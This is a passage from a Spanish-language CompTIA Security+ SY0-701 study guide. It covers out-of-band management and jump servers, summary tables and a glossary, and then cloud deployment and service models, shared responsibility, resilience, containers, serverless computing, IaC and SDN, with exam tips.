| **In-band (En banda)** | El canal de gestión comparte el tráfico de red de producción | Sí: TLS, IPsec, RDP o SSH | Menor |
| **OOB (Out-of-Band — Fuera de Banda)** | Canal físicamente separado de la red de producción | Inherente (separación física) | Mayor, pero más seguro |

**Métodos OOB:**
- Puerto de **módem o consola serie** en un router (físicamente fuera de banda).
- Interfaz de gestión en una **VLAN de gestión dedicada** o **infraestructura de red físicamente separada**.

> **Ventaja OOB:** El acceso al dispositivo se mantiene incluso cuando hay problemas en la red de producción.

#### Jump Server / Bastion Host (Servidor de Salto / Bastión)

> **Analogía:** El servidor de salto es como la puerta trasera de un edificio seguro. Para acceder a los servidores internos, primero debes entrar al servidor de salto (el guardia), que luego te escolta hasta donde necesitas ir.

**Problema:** Cuando hay muchos servidores en una zona segura, gestionar qué hosts pueden acceder a las interfaces administrativas es complejo.

**Solución — Servidor de Salto:**
- Único servidor de administración en la zona segura.
- Solo ejecuta el protocolo y puerto administrativo necesario (SSH o RDP).
- Los administradores se conectan **al servidor de salto** → desde allí se conectan a los servidores de aplicaciones.
- La interfaz de administración de cada servidor de aplicaciones solo tiene **una entrada en su ACL: el servidor de salto**.
- Cualquier intento de conexión directa desde otros hosts es **denegado**.

**Flujo de acceso:**

```
[Administrador] ---(VPN/SSH)---> [Servidor de Salto] ---(SSH/RDP)---> [Servidor de Aplicaciones]
                                                                              ↑
                                              Solo acepta conexiones desde el Servidor de Salto
```

**Reglas del servidor de salto:**

1. VPN puede usarse para acceder al servidor de salto, que luego reenvía tráfico de administración.
2. Tráfico de hosts autorizados en la red también puede ir por el servidor de salto.
3. No se permite tráfico de administración de hosts no autorizados.
4. Los servidores de aplicaciones solo aceptan conexiones administrativas desde el servidor de salto.
5. El tráfico de aplicación normal usa una red diferente.

> **👉 Enfoque de Examen SY0-701:** El servidor de salto (jump server/bastion host) es una pregunta frecuente en escenarios de gestión segura. La clave: es el único punto de acceso administrativo a servidores en una zona protegida. OOB vs. in-band: OOB es más seguro porque está separado de la red de producción — el tráfico de gestión no comparte el mismo canal. SAW es la estación cliente del administrador; el jump server es el intermediario en la red objetivo.

## 5.8 Tabla Resumen

### Puertos Clave del Tema 5

| Puerto | Protocolo | Uso |
|---|---|---|
| `TCP/22` | SSH, SFTP, SCP | Shell seguro y transferencia segura de archivos |
| `TCP/80` | HTTP | Web no cifrada |
| `TCP/443` | HTTPS (TLS) | Web cifrada |
| `TCP/3389` | RDP | Escritorio remoto de Microsoft |
| `TCP/8080` | HTTP Proxy | Puerto estándar de proxy no transparente |
| `UDP/1194` | OpenVPN | VPN TLS con UDP |
| `TCP/UDP/1812-1813` | RADIUS | Autenticación (1812), Accounting (1813) |

### Dispositivos por Capa OSI

| Capa | Dispositivo | Función |
|---|---|---|
| 1 | TAP | Copia física de señal para monitoreo |
| 2 | Switch, AP, WAP | Conmutación por MAC, VLAN |
| 3 | Router, Switch L3 | Enrutamiento por IP, separación de subredes |
| 4 | Balanceador de carga L4, Firewall stateful | TCP/UDP, sesiones |
| 7 | Proxy, WAF, NGFW, Balanceador L7 | Aplicaciones, contenido |

### Resumen de Controles de Seguridad

| Control | Tipo | Descripción |
|---|---|---|
| Cortafuego (Firewall) | Preventivo | Filtra tráfico por ACL |
| IDS | Detectivo | Alerta sin bloquear |
| IPS | Correctivo/Preventivo | Alerta y bloquea activamente |
| WAF | Preventivo/Detectivo | Protección específica de aplicaciones web |
| Balanceador de carga | Correctivo | Alta disponibilidad, mitiga DoS |
| Proxy directo | Preventivo | Controla acceso saliente de clientes |
| Proxy inverso | Preventivo | Protege servidores de solicitudes externas |
| 802.1X/EAP | Preventivo | Autenticación de acceso a la red por puerto |
| Air gap | Preventivo | Aislamiento físico total |
| Jump server | Preventivo | Punto único de acceso administrativo |
| OOB Management | Preventivo/Detectivo | Canal de gestión separado de producción |

## 5.9 Glosario del Tema 5

| Acrónimo | Significado completo |
|---|---|
| **AAA** | Authentication, Authorization, Accounting (Autenticación, Autorización y Contabilidad) |
| **ACL** | Access Control List (Lista de Control de Acceso) |
| **AH** | Authentication Header (Encabezado de Autenticación) |
| **AP / WAP** | Access Point / Wireless Access Point (Punto de Acceso Inalámbrico) |
| **ARP** | Address Resolution Protocol (Protocolo de Resolución de Direcciones) |
| **CASB** | Cloud Access Security Broker (Agente de Seguridad de Acceso a la Nube) |
| **DLP** | Data Loss Prevention (Prevención de Pérdida de Datos) |
| **DNS** | Domain Name System (Sistema de Nombres de Dominio) |
| **DoS** | Denial of Service (Denegación de Servicio) |
| **DPI** | Deep Packet Inspection (Inspección Profunda de Paquetes) |
| **DTLS** | Datagram Transport Layer Security |
| **EAP** | Extensible Authentication Protocol (Protocolo de Autenticación Extensible) |
| **EAPoL** | EAP over LAN |
| **ESP** | Encapsulating Security Payload (Carga de Seguridad Encapsuladora) |
| **FQDN** | Fully Qualified Domain Name (Nombre de Dominio Completamente Calificado) |
| **GSSAPI** | Generic Security Services Application Programming Interface |
| **ICV** | Integrity Check Value (Valor de Verificación de Integridad) |
| **IDS** | Intrusion Detection System (Sistema de Detección de Intrusiones) |
| **IKE** | Internet Key Exchange (Intercambio de Claves de Internet) |
| **IPS** | Intrusion Prevention System (Sistema de Prevención de Intrusiones) |
| **IPsec** | Internet Protocol Security (Seguridad del Protocolo de Internet) |
| **ISP** | Internet Service Provider (Proveedor de Servicios de Internet) |
| **LAN** | Local Area Network (Red de Área Local) |
| **MAC** | Media Access Control |
| **MOBIKE** | IKEv2 Mobility and Multihoming Protocol |
| **ND** | Neighbor Discovery (Protocolo de Descubrimiento Cercano) — IPv6 |
| **NGFW** | Next-Generation Firewall (Cortafuego de Próxima Generación) |
| **NIDS** | Network Intrusion Detection System |
| **OOB** | Out-of-Band (Fuera de Banda) |
| **OSI** | Open Systems Interconnection (Interconexión de Sistema Abierto) |
| **PAC** | Proxy Auto-Configuration script |
| **PKI** | Public Key Infrastructure (Infraestructura de Clave Pública) |
| **PNAC** | Port-based Network Access Control (Control de Acceso a Red Basado en Puertos) |
| **PPTP** | Point-to-Point Tunneling Protocol (Protocolo de Túnel Punto a Punto) — OBSOLETO |
| **PSK** | Pre-Shared Key (Clave Pre-compartida) |
| **RADIUS** | Remote Authentication Dial-In User Service (Servicio de Autenticación Remota de Usuario por Acceso Telefónico) |
| **RDP** | Remote Desktop Protocol (Protocolo de Escritorio Remoto) |
| **SA** | Security Association (Asociación de Seguridad) |
| **SAW** | Secure Administrative Workstation (Estación de Trabajo Administrativa Segura) |
| **SCP** | Secure Copy Protocol |
| **SFTP** | Secure File Transfer Protocol |
| **SLA** | Service Level Agreement (Acuerdo de Nivel de Servicio) |
| **SPAN** | Switched Port Analyzer (Analizador de Puerto Conmutado) |
| **SPOF** | Single Point of Failure (Punto Único de Falla) |
| **SSH** | Secure Shell (Shell Seguro) |
| **SSO** | Single Sign-On (Inicio de Sesión Único) |
| **TAP** | Test Access Point (Punto de Acceso de Prueba) |
| **TCP** | Transmission Control Protocol (Protocolo de Control de Transmisión) |
| **TLS** | Transport Layer Security (Seguridad de la Capa de Transporte) |
| **UDP** | User Datagram Protocol (Protocolo de Datagrama de Usuario) |
| **UTM** | Unified Threat Management (Administración de Amenazas Unificadas) |
| **VLAN** | Virtual LAN (Red de Área Local Virtual) |
| **VNC** | Virtual Network Computing |
| **VoIP** | Voice over IP (Voz sobre Protocolo de Internet) |
| **VPN** | Virtual Private Network (Red Privada Virtual) |
| **WAF** | Web Application Firewall (Cortafuego de Aplicaciones Web) |
| **WAN** | Wide Area Network (Red de Área Amplia) |
| **WPAD** | Web Proxy Auto-Discovery Protocol |

---

# 6 Arquitectura de red segura en la nube

La arquitectura de red en la nube garantiza la **confidencialidad, integridad y disponibilidad (CIA)** de datos y aplicaciones. Sus características clave son:

- **Aprovisionamiento bajo demanda** — recursos disponibles de inmediato.
- **Elasticidad y escalabilidad** — ajustes dinámicos de cómputo, almacenamiento y red.
- **Virtualización y multiinquilino** — intercambio y aislamiento eficiente de recursos.
- **Equilibrio de carga y escalado automático** — alta disponibilidad y rendimiento.
- **Estrategias híbridas y multinube** — reduce dependencia del proveedor (vendor lock-in).

**Objetivos de aprendizaje del tema:**
1. Resumir los servicios seguros en la nube y de virtualización.
2. Aplicar soluciones de seguridad en la nube.
3. Resumir los conceptos de infraestructura como código.
4. Explorar el Internet de las cosas.
5. Revisar los conceptos de arquitectura de confianza cero.

# 6.1 Infraestructura en la Nube

## 6.1.1 Modelos de Despliegue en la Nube

> **Analogía:** Piensa en los modelos de despliegue como tipos de vivienda: la nube pública es un piso compartido (barato, con vecinos); la privada, una casa propia (cara, total control); la híbrida, tener casa y reservar hotel cuando hay muchas visitas.

### Tipos de Modelos de Despliegue

| Modelo | Descripción | Seguridad | Costo |
|--------|-------------|-----------|-------|
| **Público (multiusuario)** | Servicio ofrecido por un **CSP** (Cloud Service Provider / Proveedor de Servicios en la Nube) via Internet; suscripción o pago por uso | Menor — recurso compartido | Menor |
| **Privado alojado** | Infraestructura hospedada por tercero para uso **exclusivo** de la organización | Alta | Alto |
| **Privado** | Infraestructura completamente privada y propiedad de la organización (ideal: banca, gobierno) | Máxima — control total | Muy alto |
| **Comunitario** | Varias organizaciones comparten costos de una nube privada (preocupaciones comunes: estándares, políticas de seguridad) | Alta entre miembros | Moderado |
| **Híbrido** | Combinación de nube pública + privada (o cualquier combinación de los anteriores) | Variable — gestión compleja | Variable |
| **Multinube** | Uso de servicios de **varios CSP** distintos | Complejidad añadida | Variable |

### Consideraciones de Seguridad por Arquitectura

- **Un solo inquilino (Single-Tenant):** Infraestructura dedicada → máxima seguridad → cliente con control total → más costoso → cliente gestiona la seguridad.
- **Multiinquilino (Multi-Tenant):** Datos de varios clientes separados **lógicamente** → rentable → mayor riesgo de acceso no autorizado si no se protege correctamente.
- **Híbrida:** Flexibilidad y control sobre datos confidenciales → requiere gestión cuidadosa → riesgo de brechas por confusión del límite entre local y nube pública.
- **Sin servidor (Serverless):** El CSP gestiona y protege la infraestructura → el cliente debe asegurar el acceso a sus apps y datos.

### Nube Híbrida — Desafíos de Seguridad Específicos

- Gestión de múltiples entornos en la nube.
- Aplicación de políticas de seguridad **coherentes**.
- Acceso no autorizado, especialmente en datos en nube pública.
- Redundancia de datos → posibles **problemas de sincronización**.
- Cumplimiento legal (GDPR, HIPAA, PCI DSS) en ambos entornos.
- **SLA (Service Level Agreement / Acuerdo de Nivel de Servicio):** establece expectativas de rendimiento, disponibilidad y soporte — puede ser difícil garantizar cuando se integran sistemas locales y en la nube.
- Latencia de red adicional en transferencias de grandes volúmenes de datos.

> **👉 Enfoque de Examen SY0-701:**
> CompTIA pregunta frecuentemente sobre qué modelo usar en escenarios específicos. **Distractor común:** confundir "privado alojado" con "privado puro" — el alojado sigue siendo de terceros. Recuerda: multinube = varios CSP; híbrida = nube pública + privada. La triada CIA puede aparecer: en nube **pública**, los riesgos de **confidencialidad** son mayores. Vigila preguntas sobre SLA e ISA como mecanismos de gobierno en la nube.

## 6.1.2 Modelo de Servicios en la Nube (XaaS)

> **Analogía:** Los modelos de servicio son como cocinar: IaaS es comprar los ingredientes y el fogón (tú cocinas todo); PaaS es una cocina equipada donde tú solo haces la receta; SaaS es pedir el plato listo al restaurante.

**XaaS** (Anything as a Service / Cualquier cosa como servicio) — término paraguas para todos los modelos de servicio en la nube.

### Los tres modelos principales

| Modelo | Significado | Qué gestiona el CSP | Qué gestiona el cliente | Ejemplos |
|--------|-------------|---------------------|------------------------|----------|
| **SaaS** | Software as a Service / Software como Servicio | Todo (infra, SO, app) | Solo los datos y accesos | Microsoft 365, Salesforce, Google Workspace |
| **PaaS** | Platform as a Service / Plataforma como Servicio | Infra + plataforma/BD | La aplicación creada sobre la plataforma | Oracle DB, Azure SQL Database, Google App Engine |
| **IaaS** | Infrastructure as a Service / Infraestructura como Servicio | Hardware físico y red | SO, apps, datos, configuración | Amazon EC2, Azure VMs, Oracle Cloud, OpenStack |
| **FaaS** | Function as a Service / Función como Servicio | Toda la infra (serverless) | Solo el código de la función | AWS Lambda, Azure Functions, Google Cloud Functions |

### Proveedores de Terceros

- **SLA:** Disposiciones contractuales que delinean métricas de uptime, rendimiento y tiempos de respuesta → con penalizaciones si no se cumplen.
- Evaluar: cifrado, controles de acceso, gestión de vulnerabilidades, respuesta a incidentes y cumplimiento normativo.
- **PII** (Personally Identifiable Information / Información de Identificación Personal) — especial cuidado si el proveedor la maneja.
- **Vendor lock-in (dependencia del proveedor):** examinar portabilidad, interoperabilidad y estandarización de datos.
- Estrategia de mitigación: implementaciones **multinube o híbridas**.

> **👉 Enfoque de Examen SY0-701:**
> Memoriza la tabla de responsabilidades: en **SaaS**, el CSP gestiona el SO y la red; en **IaaS**, la responsabilidad de red es **compartida**. FaaS = serverless. CompTIA puede preguntarte qué modelo usar si la empresa quiere "solo ejecutar su código sin gestionar servidores" → **FaaS/Serverless**. Los SLA son contractuales, no técnicos — no los confundas con controles de seguridad.

## 6.1.3 Matriz de Responsabilidades (Shared Responsibility Model)

> **Analogía:** Como en un edificio de apartamentos: el propietario del edificio (CSP) mantiene la estructura, fontanería y seguridad del portal; el inquilino (cliente) cierra su puerta con llave y protege sus objetos dentro del piso.

**Principio fundamental:** Los riesgos de seguridad **no se transfieren** al CSP, sino que se **comparten**. La seguridad en la nube es una **responsabilidad compartida**.

### Matriz de Responsabilidades por Modelo de Servicio

| Área de Responsabilidad | On-Premises | IaaS | PaaS | SaaS | FaaS |
|------------------------|-------------|------|------|------|------|
| Clasificación de datos | Cliente | Cliente | Cliente | Cliente | Cliente |
| Protección de endpoint | Cliente | Cliente | Cliente | Compartida | Compartida |
| Gestión de identidad y acceso (IAM) | Cliente | Cliente | Compartida | Compartida | Compartida |
| Controles de aplicación | Cliente | Cliente | Compartida | Compartida | Compartida |
| Controles de red | Cliente | Compartida | CSP | CSP | CSP |
| Infraestructura del host | Cliente | Compartida | CSP | CSP | CSP |
| Seguridad física | Cliente | CSP | CSP | CSP | CSP |

### Responsabilidades del CSP

- Seguridad física de la infraestructura.
- Protección de equipos de cómputo, almacenamiento y red.
- Seguridad de red (protección contra ataques DDoS).
- Backup y recuperación de almacenamiento en la nube.
- Aislamiento de recursos entre inquilinos.
- Identidad y control de acceso de recursos del inquilino.
- Seguridad y gestión de centros de datos en múltiples regiones.

### Responsabilidades del Cliente

- Gestión de identidad del usuario.
- Configuración de la ubicación geográfica de los datos.
- Controles de acceso de usuarios y servicios.
- Configuración de seguridad de datos y aplicaciones.
- Protección del SO (cuando aplica, en IaaS).
- Cifrado y gestión de claves.

> **⚠️ Concepto clave:** La identificación del límite entre responsabilidades del cliente y del CSP es un **esfuerzo deliberado** — no es automático ni pasivo. Un error en esta identificación introduce vulnerabilidades.

> **👉 Enfoque de Examen SY0-701:**
> Esta es una de las áreas más preguntadas del dominio de arquitectura. CompTIA presentará escenarios donde debes identificar quién es responsable de qué. **Distractor frecuente:** asumir que el CSP es responsable de todo en SaaS — el cliente **siempre** es responsable de la clasificación de datos y la gestión de identidades de sus usuarios. Memoriza que la seguridad física **siempre** es del CSP (excepto on-premises).

## 6.1.4 Computación Centralizada y Descentralizada

### Arquitectura Centralizada

- Todo el procesamiento y almacenamiento en **una única ubicación** (servidor central).
- Los usuarios confían en la integridad del administrador del servidor.
- **Ejemplos:** Mainframes (computadoras centrales), arquitecturas cliente-servidor.
- **Uso:** Grandes organizaciones que requieren control y gestión estrictos.

### Arquitectura Descentralizada

- Procesamiento y almacenamiento distribuidos en **múltiples ubicaciones o dispositivos**.
- Ningún dispositivo o ubicación única tiene toda la responsabilidad.
- **Beneficios:** Mejor tolerancia a fallas, escalabilidad, características de seguridad únicas.

### Ejemplos de Arquitectura Descentralizada

| Tecnología | Descripción |
|-----------|-------------|
| **Blockchain** | Tecnología de contabilidad distribuida — transacciones seguras, transparentes y descentralizadas |
| **Redes P2P** (Peer-to-Peer) | Distribución del procesamiento y almacenamiento entre nodos participantes sin servidor central |
| **CDN** (Content Delivery Network / Red de Distribución de Contenido) | Distribuye contenido en múltiples servidores para mejorar rendimiento, confiabilidad y escalabilidad |
| **IoT** (Internet of Things / Internet de las Cosas) | Dispositivos conectados en red descentralizada para compartir datos y capacidad de procesamiento |
| **Bases de datos distribuidas** | Datos divididos entre varios servidores — alta disponibilidad aunque un servidor falle |
| **Tor** (The Onion Router) | Red de comunicación anónima — enruta tráfico a través de nodos operados por voluntarios para ocultar la identidad y actividad del usuario |

> **👉 Enfoque de Examen SY0-701:**
> Tor puede aparecer en preguntas sobre privacidad y anonimato — no confundir con una herramienta de seguridad corporativa. Blockchain puede aparecer asociado a integridad de datos (no repudio). CDN → disponibilidad. Vigila el **tradeoff**: centralizado = más control, descentralizado = más resiliencia.

## 6.1.5 Conceptos de Arquitectura Resiliente

### Alta Disponibilidad (HA — High Availability)

- **HA:** Aprovisionamiento con garantía de al menos **99.99% de uptime** (tiempo activo).
- El CSP utiliza una **capa de virtualización** para asegurar que cómputo, almacenamiento y red cumplan los criterios del SLA.
- Redundancia: múltiples controladores de disco y dispositivos de almacenamiento.
- Los datos se pueden replicar entre diferentes conjuntos, cada uno respaldado por hardware independiente.

### Replicación de Datos

- Permite copiar información hacia donde pueda usarse más eficientemente.
- La nube como área de almacenamiento central facilita disponibilidad entre unidades de negocio.
- Requiere conexiones de red de **baja latencia**, seguridad e integridad de datos.

**Tipos de almacenamiento por velocidad:**

| Tipo | Descripción | Velocidad | Costo |
|------|-------------|-----------|-------|
| **Hot Storage** (almacenamiento en caliente) | Recuperación de datos rápida | Alta | Alto |
| **Cold Storage** (almacenamiento en frío) | Recuperación de datos lenta | Baja | Bajo |

### Niveles de Replicación (Zonas de Disponibilidad)

Los CSP dividen el mundo en **regiones** independientes, que a su vez se dividen en **zonas de disponibilidad** con centros de datos independientes (energía, refrigeración y red propias).

| Nivel de Replicación | Descripción |
|---------------------|-------------|
| **Local** | Réplica dentro de un solo centro de datos en la región, en dominios de fallas y actualización separados |
| **Regional (Zone-Redundant Storage)** | Réplica en varios centros de datos dentro de una o dos regiones — protección ante fallo de un centro |
| **GRS (Geo-Redundant Storage / Almacenamiento georredundante)** | Réplica en una **región secundaria** alejada de la primaria — protección ante desastre o interrupción regional |

> **Consideración:** Una base de datos generalmente requiere replicación **síncrona** de baja latencia — la transacción no se considera completa hasta que se ha replicado. Un archivo de respaldo puede tolerar replicación asíncrona.

> **👉 Enfoque de Examen SY0-701:**
> Las preguntas sobre resiliencia suelen pedir qué nivel de replicación aplicar ante un escenario de desastre regional → **GRS**. Hot vs. Cold Storage aparece frecuentemente en preguntas de costo vs. velocidad de recuperación. Recuerda: HA ≠ DR (Disaster Recovery) — HA es disponibilidad continua, DR es recuperación ante catástrofe.

## 6.1.6 Virtualización de Aplicaciones y Contenedores

### Virtualización de Aplicaciones

- Tipo más limitado de **VDI** (Virtual Desktop Infrastructure / Infraestructura de Escritorio Virtual).
- El cliente accede a una aplicación alojada en un servidor o la transmite (streaming) al cliente para procesamiento local.
- Soluciones principales: **Citrix XenApp**, **Microsoft App-V**, **VMware ThinApp**.
- Implementación habitual mediante aplicaciones de **escritorio remoto HTML5 "sin cliente"** — acceso desde un navegador web convencional.

### Contenedorización

> **Analogía:** Un contenedor de software es como un contenedor físico marítimo: empaqueta todo lo que la aplicación necesita (código, bibliotecas, configuraciones) en una unidad portátil, independientemente del barco (hardware) que lo transporte.

- **Contenedor:** Encapsula código, bibliotecas y configuraciones en una unidad portátil autocontenida.
- Garantiza comportamiento **consistente** de la aplicación independientemente de la plataforma subyacente.
- **Docker** es la plataforma de contenedores más popular (equivalente al "buque de carga").
- Evita el **"infierno de dependencias"** (dependency hell) — problemas de versiones incompatibles en instalaciones tradicionales.
- Las aplicaciones contenedorizadas son **unidades autocontenidas**, cada una con su propia copia de dependencias.

### Hipervisores

| Tipo | Descripción | Características | Ejemplos |
|------|-------------|-----------------|----------|
| **Tipo 1 (Bare-Metal)** | Se ejecuta **directamente** sobre el hardware físico | Alto rendimiento y eficiencia, ideal para empresas | VMware ESXi, Microsoft Hyper-V |
| **Tipo 2 (Hosted)** | Se ejecuta sobre un **sistema operativo anfitrión** | Menor rendimiento, ideal para desarrollo y pruebas | VMware Workstation, Oracle VirtualBox |

### VM vs. Contenedores

| Característica | Máquina Virtual (VM) | Contenedor |
|---------------|---------------------|------------|
| **Aislamiento** | SO invitado completo (Guest OS) | Comparte el kernel del SO anfitrión |
| **Tamaño** | GBs (incluye SO completo) | MBs (solo app + dependencias) |
| **Arranque** | Minutos | Segundos |
| **Hipervisor** | Requiere hipervisor (Tipo 1 o 2) | Requiere motor de contenedores (Docker) |
| **Portabilidad** | Menor | Mayor |
| **Seguridad** | Mejor aislamiento | Riesgo si el kernel del host se compromete |

> **👉 Enfoque de Examen SY0-701:**
> La diferencia Tipo 1 vs. Tipo 2 es pregunta frecuente. **Bare-metal = Tipo 1 = producción empresarial**. Contenedores vs. VM: CompTIA preguntará qué usar cuando se prioriza velocidad de despliegue y portabilidad → contenedores. Mayor aislamiento de seguridad → VM. Recuerda: Docker = motor de contenedores, no hipervisor.

## 6.1.7 Arquitectura en la Nube

### Computación Sin Servidor (Serverless)

- El **CSP** gestiona la infraestructura y asigna recursos automáticamente.
- Se cobra **únicamente por el uso real** (tiempo de ejecución), no por hora.
- Las organizaciones se centran en el **desarrollo** de aplicaciones, no en la gestión de servidores.
- Las aplicaciones se desarrollan como **funciones y microservicios**.
- No se aprovisionan múltiples servidores para redundancia o balanceo de carga — el CSP lo gestiona.
- **VPC** (Virtual Private Cloud / Nube Privada Virtual) — a diferencia de las ofertas "convencionales", en serverless los servicios no se ejecutan en instancias de VM.

**Ejemplos de casos de uso:**
- Chatbots para atención al cliente.
- Back-ends móviles.
- Procesamiento basado en eventos (lecturas de sensores, alertas).

**Principales proveedores:**
- **AWS Lambda** (`aws.amazon.com/lambda`)
- **Google Cloud Functions** (`cloud.google.com/functions`)
- **Microsoft Azure Functions** (`azure.microsoft.com/services/functions`)

**Ventajas de seguridad en serverless:**
- Poco o ningún esfuerzo de gestión de parches de SO.
- No hay privilegios de administración que gestionar.
- El proveedor gestiona la seguridad del sistema de archivos.

> **Analogía:** La computación sin servidor es como usar el servicio de electricidad de tu ciudad — no gestionas la central eléctrica, solo enchufas y pagas por lo que consumes.

### Microservicios

- Enfoque arquitectónico: aplicación como colección de **servicios pequeños e independientes**.
- Cada microservicio se centra en una capacidad comercial específica.
- **Modular:** interfaz bien definida, responsabilidad única.
- Los equipos trabajan independientemente en distintas funciones.
- **Riesgo:** problemas de integración — componentes individuales funcionan bien, pero al integrarlos surgen problemas difíciles de aislar.
- Frecuentemente implementado mediante prácticas de **IaC** (Infraestructura como Código).

### Cambios Transformacionales (Servicios Nativos de Nube)

| Servicio | Beneficio |
|----------|-----------|
| Cómputo elástico y autoescalado | Cambios dinámicos en potencia de cómputo según demanda |
| Computación sin servidor | Elimina la necesidad de servidores tradicionales |
| **CDN** (Content Delivery Network) | Optimiza tráfico web almacenando contenido en caché |
| Almacenamiento de objetos | Datos masivos y no estructurados — reemplaza servidores de archivos |
| IAM (Identity and Access Management) | Funciones de seguridad avanzadas e integración de plataformas |
| Contenedorización y orquestación | Cambia cómo se implementan y gestionan las aplicaciones |
| IA/ML, IoT back-end, Big Data | Amplían el rango de posibilidades |

> **⚠️ Alerta de seguridad:** La tasa de cambio y los riesgos desconocidos en plataformas en la nube generan nuevos problemas de seguridad significativos y vulneraciones de datos sin precedentes.

> **👉 Enfoque de Examen SY0-701:**
> Serverless/FaaS: el cliente NO gestiona el SO ni los parches. Microservicios: el riesgo es en la **integración**, no en los componentes individuales. Preguntas de escenario: "Una empresa quiere escalar automáticamente según demanda sin administrar servidores" → FaaS/Serverless. "Una empresa quiere dividir su aplicación monolítica en componentes independientes" → Microservicios.

## 6.1.8 Tecnologías de Automatización en la Nube

### Infraestructura como Código (IaC — Infrastructure as Code)

> **Analogía:** IaC es como tener los planos arquitectónicos de tu casa en formato digital — puedes construir exactamente la misma casa en cualquier lugar del mundo, sin errores de construcción manual, y el resultado siempre será idéntico.

- **IaC:** Práctica de ingeniería de software que gestiona la infraestructura usando **archivos de definición legibles por máquina**.
- Reduce el riesgo de errores por intervención manual.
- Los archivos están **controlados por versiones** (tratados como código fuente).
- Permite replicar infraestructura en diferentes entornos (desarrollo, staging, producción) de forma consistente y reproducible.

**Formatos de archivos IaC:**

| Formato | Descripción |
|---------|-------------|
| **YAML** | Yet Another Markup Language — legible por humanos, ampliamente usado |
| **JSON** | JavaScript Object Notation — estructurado, intercambio de datos |
| **HCL** | HashiCorp Configuration Language — desarrollado por HashiCorp, usado en Terraform y Consul; similar a JSON y YAML pero con características adicionales para gestión de infraestructura (soporta variables, sintaxis concisa) |

**Los archivos de definición contienen:**
- Estado de la infraestructura deseada.
- Ajustes de configuración.
- Requisitos de red.
- Políticas de seguridad.
- Otros parámetros.

### Tecnologías de Capacidad de Respuesta

| Tecnología | Descripción |
|-----------|-------------|
| **Balanceo de carga (Load Balancing)** | Distribuye tráfico de red a través de múltiples servidores para mejorar rendimiento y alta disponibilidad. Los load balancers actúan como **intermediarios (proxies)** entre usuarios y recursos back-end (VMs, contenedores). Usan algoritmos sofisticados para distribuir solicitudes y gestionar capacidad, tiempo de respuesta y carga de trabajo. |
| **Computación periférica (Edge Computing)** | Optimiza la ubicación geográfica de recursos para procesamiento más rápido y **menor latencia**. En lugar de enrutar todo a un centro de datos centralizado, usa recursos distribuidos para minimizar la distancia que los datos viajan. Ideal para: IoT, CDN, aplicaciones sensibles a la latencia. |
| **Escalado automático (Auto-Scaling)** | Proceso automatizado que ajusta recursos informáticos según la demanda en tiempo real. Durante alta demanda → aprovisiona recursos adicionales automáticamente. Durante baja demanda → libera recursos al grupo compartido → reduce costos operativos. |

> **👉 Enfoque de Examen SY0-701:**
> IaC = automatización + consistencia + reducción de errores manuales. HCL es el formato de Terraform (HashiCorp). Balanceo de carga → disponibilidad; Edge Computing → latencia; Auto-Scaling → elasticidad. Pregunta tipo: "¿Qué tecnología permitiría a una empresa ajustar automáticamente sus recursos de cómputo durante picos de demanda?" → Auto-Scaling. No confundas balanceador de carga con firewall.

## 6.1.9 Redes Definidas por Software (SDN — Software-Defined Networking)

> **Analogía:** SDN es como separar el piloto automático del avión del propio avión. El plano de control (piloto automático) toma decisiones de vuelo, el plano de datos (motores y alerones) ejecuta esas decisiones, y el plano de gestión (torre de control) monitorea todo.

La IaC se ve facilitada por dispositivos de red físicos y virtuales que se pueden configurar mediante **scripts y API**.

### Los Tres Planos de Red

| Plano | Función |
|-------|---------|
| **Plano de Gestión (Management Plane)** | Monitorea las condiciones del tráfico y el estado de la red |
| **Plano de Control (Control Plane)** | Toma decisiones sobre cómo priorizar, asegurar y enrutar el tráfico |
| **Plano de Datos (Data Plane)** | Maneja la conmutación y enrutamiento del tráfico; impone controles de acceso |

### Arquitectura SDN

```
[Aplicaciones SDN]
      |
   API "Northbound" (dirección norte)
      |
[Controlador SDN]
      |
   API "Southbound" (dirección sur)
      |
[Dispositivos de Red: físicos y virtuales]
```

- **API Northbound:** Interfaz entre aplicaciones SDN y el controlador SDN.
- **API Southbound:** Interfaz entre el controlador SDN y los dispositivos de red.
- SDN gestiona dispositivos físicos compatibles, **conmutadores virtuales, enrutadores y cortafuegos**.

### NFV (Network Functions Virtualization / Virtualización de Funciones de Red)

- Arquitectura que permite implementar redes virtuales mediante **VMs de propósito general y contenedores**.
- Ahorra trabajo y complejidad de configuración manual de dispositivos.
- Posibilita implementación **totalmente automatizada** (aprovisionamiento) de enlaces de red, dispositivos y servidores.
- Parte importante de tecnologías de **automatización y orquestación**.

> **👉 Enfoque de Examen SY0-701:**
> Memoriza los tres planos y sus funciones. SDN separa el **control** de los **datos** — esto es fundamental. **Distractor:** confundir SDN con NFV; SDN = políticas de red vía software; NFV = virtualización de las propias funciones de red. API Northbound = hacia las apps; API Southbound = hacia los dispositivos. Pregunta típica: "¿Qué tecnología permite a un administrador configurar políticas de red mediante una API centralizada?" → SDN.

## 6.1.10 Características de la Arquitectura en la Nube

### Características Clave

| Característica | Descripción |
|---------------|-------------|
| **Costo** | Cambio de **CapEx** (Capital Expenditure — gastos de capital iniciales: hardware, licencias, configuración) a **OpEx** (Operational Expenditure — gastos operativos: pago por uso). Alinea gastos con uso real. Recursos no optimizados pueden generar costos elevados. |
| **Escalabilidad** | Capacidad de expandir y contraer dinámicamente. **Escalado vertical (Scale-Up):** añadir capacidad a un recurso existente (más CPU, RAM). **Escalado horizontal (Scale-Out):** añadir más instancias en paralelo. |
| **Resiliencia** | Hardware redundante, tolerancia a fallas (clústeres), replicación en múltiples servidores y centros de datos. |
| **Facilidad de implementación** | Automatización (reduce intervención manual), estandarización (plantillas e imágenes consistentes), portabilidad (evita vendor lock-in). |
| **Facilidad de recuperación** | Backup/restauración automatizados, arquitecturas redundantes, servicios DR (Disaster Recovery) en diferentes regiones geográficas. |
| **Energía** | Infraestructura de energía redundante (SAI, generadores), monitoreo en tiempo real. **PUE** (Power Usage Effectiveness / Efectividad en el Uso de Energía) — métrica de eficiencia energética del datacenter. PUE más bajo = mayor proporción de energía para cómputo. |
| **Cómputo** | Elasticidad, agrupación de recursos, orquestación, automatización, computación sin servidor. |
| **Redes** | Redes virtuales para comunicación segura, load balancers, CDN, conectividad privada y pública. |

### SLA e ISA

- **SLA (Service Level Agreement / Acuerdo de Nivel de Servicio):** Define niveles de servicio esperados — rendimiento, disponibilidad, soporte → con créditos o reembolsos si no se cumplen.
- **ISA (Interconnection Security Agreement / Acuerdo de Seguridad de Interconexión):** Establece requisitos y responsabilidades de seguridad entre la organización y el CSP:
  - Métodos de cifrado.
  - Controles de acceso.
  - Gestión de vulnerabilidades.
